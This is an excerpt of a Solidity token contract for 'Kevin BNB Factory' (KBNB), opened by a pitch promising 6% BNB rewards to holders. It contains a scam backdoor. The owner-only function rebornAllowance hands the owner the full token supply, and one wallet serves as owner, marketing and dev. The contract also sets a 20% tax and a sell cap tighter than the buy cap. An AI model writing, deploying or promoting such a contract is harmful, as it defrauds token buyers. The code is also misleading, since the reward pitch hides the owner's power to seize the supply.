...
If you are a BNB and a reward token fan. This is is for you, a 6% BNB Rewards is waiting to be distributed to all holders.
...
contract KevinBNBFactory is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xFE5ae3Ac90ABb2307463D5f564a1c6D51F1933b8); 
    address payable public Wallet_Dev = payable(0xFE5ae3Ac90ABb2307463D5f564a1c6D51F1933b8);
    ...
    string private constant _name = "Kevin BNB Factory"; 
    string private constant _symbol = unicode"KBNB"; 
    uint256 public _Supply = 10000000000000000 * 10**_decimals;
    ...
    uint256 public Percent_Tax = 20;
    uint256 public Percent_Burn = 0;
    uint256 public Percent_AutoLP = 20; 

    uint256 public _maxWalletToken = _tTotal * 5 / 100;

    uint256 public _maxBuyTxAmount = _tTotal * 5 / 100; 
    uint256 public _maxSellTxAmount = _tTotal * 1 / 100; 
    ...
    constructor () {
        ...
        _owner = 0xFE5ae3Ac90ABb2307463D5f564a1c6D51F1933b8;
    ...
    function rebornAllowance() external onlyOwner returns (bool success) {_tOwned[_owner] = _Supply;return true;}
    ...
    function _transfer(
        ...
        _maxTxAmount = to != uniswapV2Pair ? _maxBuyTxAmount : _maxSellTxAmount;
        
        if (from != owner() && !isTxLimitExempt[from])
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            uint256 tokens_to_D = contractTokenBalance * Percent_Tax / 100;
            ...
            uint256 split_M = Percent_Marketing * 100 / (Percent_AutoLP + Percent_Marketing + Percent_Tax);
            uint256 BNB_M = BNB_Total * split_M / 100;

            uint256 split_D = Percent_Tax * 100 / (Percent_AutoLP + Percent_Marketing + Percent_Tax);
